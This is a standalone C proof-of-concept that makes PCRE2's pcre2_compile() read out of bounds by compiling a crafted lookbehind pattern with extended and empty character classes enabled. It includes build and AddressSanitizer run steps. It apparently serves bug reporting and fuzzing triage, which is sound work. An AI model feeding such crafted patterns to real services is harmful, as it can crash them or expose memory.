/* Standalone PoC: a nested extended class containing an empty class inside a
   lookbehind triggers an out-of-bounds read while the lookbehind's fixed
   length is computed during pcre2_compile().

   Build (patched tree, with AddressSanitizer):
     cc -I src -fsanitize=address -o pocs/newbug pocs/newbug.c \
        .libs/libpcre2-8.a
   Run:
     ASAN_OPTIONS=abort_on_error=1 ./pocs/newbug
*/

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"
#include <stdio.h>

int main(void)
{
int errorcode;
PCRE2_SIZE erroroffset;
pcre2_code *re;

/* In-contract input: an ordinary pattern string compiled with two documented
   option bits.  Only the pattern bytes are crafted. */
PCRE2_SPTR pattern = (PCRE2_SPTR)"(?<=[a[]])x";
uint32_t options = PCRE2_ALT_EXTENDED_CLASS | PCRE2_ALLOW_EMPTY_CLASS;

re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, options,
  &errorcode, &erroroffset, NULL);

if (re == NULL)
  {
  PCRE2_UCHAR buf[256];
  pcre2_get_error_message(errorcode, buf, sizeof(buf));
  printf("compile failed at %d: %s\n", (int)erroroffset, (char *)buf);
  return 1;
  }

printf("compiled\n");
pcre2_code_free(re);
return 0;
}
